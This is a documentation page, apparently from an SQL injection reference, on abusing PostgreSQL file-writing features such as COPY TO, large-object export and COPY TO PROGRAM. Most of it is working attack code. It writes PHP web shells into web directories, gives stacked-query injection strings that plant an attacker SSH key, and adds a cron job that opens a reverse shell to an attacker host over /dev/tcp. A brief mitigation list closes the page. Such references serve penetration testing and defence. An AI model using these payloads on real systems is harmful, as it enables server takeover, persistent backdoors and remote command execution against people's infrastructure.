---
title: Writing Files
description: Techniques for writing files to the filesystem using PostgreSQL
category: Advanced Techniques
order: 17
tags: ["file operations", "copy", "web shell"]
lastUpdated: 2025-12-07
---

## Writing Files

PostgreSQL provides functionality to write data to files on the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To write files from PostgreSQL, you typically need:

1. Superuser privileges, OR
2. Membership in the `pg_write_server_files` role (PostgreSQL 11+)
3. Write permissions on the target directory for the `postgres` OS user

### Using COPY TO

The primary method for writing files:

```sql
-- Write query results to file
COPY (SELECT 'Hello World') TO '/tmp/test.txt';

-- Write table data
COPY users TO '/tmp/users.csv';

-- Write with specific format
COPY (SELECT * FROM users) TO '/tmp/users.csv' WITH CSV HEADER;
```

### Writing Web Shells

#### PHP Web Shell

```sql
-- Simple PHP shell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- More stealthy version
COPY (SELECT '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>') TO '/var/www/html/images/blank.php';
```

#### Alternative PHP Payloads

```sql
-- Using base64
COPY (SELECT '<?php eval(base64_decode($_POST["e"])); ?>') TO '/var/www/html/x.php';

-- Minimal shell
COPY (SELECT '<?=`$_GET[0]`?>') TO '/var/www/html/s.php';
```

### Using Large Objects

Large objects can be used for file operations:

```sql
-- Create large object with content
SELECT lo_create(1337);
INSERT INTO pg_largeobject VALUES (1337, 0, decode('3c3f706870207379...', 'hex'));

-- Export to file
SELECT lo_export(1337, '/var/www/html/shell.php');

-- Clean up
SELECT lo_unlink(1337);
```

### Using lo_from_bytea() (PostgreSQL 9.4+)

```sql
-- Create large object from bytea
SELECT lo_from_bytea(0, '<?php system($_GET["cmd"]); ?>'::bytea);
-- Returns OID

-- Export to file
SELECT lo_export(<oid>, '/var/www/html/shell.php');
```

### COPY TO PROGRAM

Execute commands with output (PostgreSQL 9.3+):

```sql
-- Write to file using shell commands
COPY (SELECT '') TO PROGRAM 'echo "<?php system($_GET[cmd]); ?>" > /var/www/html/shell.php';

-- Alternative using tee
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';
```

### Common Writable Directories

| Path                     | Description               |
| ------------------------ | ------------------------- |
| `/tmp/`                  | Usually world-writable    |
| `/var/tmp/`              | Persistent temp directory |
| `/var/www/html/`         | Common web root           |
| `/var/www/html/uploads/` | Upload directories        |
| `/var/www/html/images/`  | Image directories         |
| `/var/lib/postgresql/`   | PostgreSQL home           |

### Finding Writable Directories

```sql
-- Check if directory is writable by attempting write
-- This will error if not writable
COPY (SELECT 'test') TO '/var/www/html/test.txt';

-- List directory to find potential targets
SELECT pg_ls_dir('/var/www/html');
```

### Injection Examples

```sql
-- Write web shell (stacked query)
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--

-- Using large objects
'; SELECT lo_export(lo_from_bytea(0,'<?php system($_GET["cmd"]); ?>'::bytea),'/var/www/html/sh.php')--

-- Write SSH key
'; COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO '/var/lib/postgresql/.ssh/authorized_keys'--

-- Write cron job
'; COPY (SELECT '* * * * * postgres /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"') TO '/etc/cron.d/backdoor'--
```

### Writing Binary Files

```sql
-- Using large objects for binary data
SELECT lo_create(0);  -- Create new large object
-- Get the returned OID, then:
SELECT lowrite(lo_open(<oid>, 131072), decode('<hex_data>', 'hex'));
SELECT lo_close(lo_open(<oid>, 131072));
SELECT lo_export(<oid>, '/path/to/file');
```

### PostgreSQL 11+ Role-Based Access

```sql
-- Check if user has file write privileges
SELECT pg_has_role(current_user, 'pg_write_server_files', 'member');
```

### Mitigation

1. Never run PostgreSQL as root
2. Restrict superuser access
3. Use `pg_write_server_files` role judiciously
4. Set restrictive filesystem permissions
5. Use SELinux/AppArmor to confine PostgreSQL
6. Monitor file system changes in web directories
